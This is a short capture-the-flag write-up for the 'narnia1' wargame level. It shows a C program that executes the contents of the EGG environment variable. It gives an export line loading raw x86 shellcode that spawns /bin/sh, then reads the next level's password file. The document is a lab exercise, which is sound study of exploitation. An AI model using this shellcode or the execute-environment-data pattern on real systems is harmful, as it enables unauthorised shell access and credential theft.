# narnia1

**Challenge Description:** This challenge requires the attacker to take
advantage of the *EGG* environment variable. The source code takes whatever is
stored in the environment variable and executes it. This can be used to spawn a
shell!


```.c
//narnia1.c

#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

The code blindly executes whatever is stored in the EGG environment variable. We
can take advanatage of this to spawn a shell.

```
export EGG=$(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

Lastly, print out the flag with ```cat /etc/narnia_pass/narnia2```.
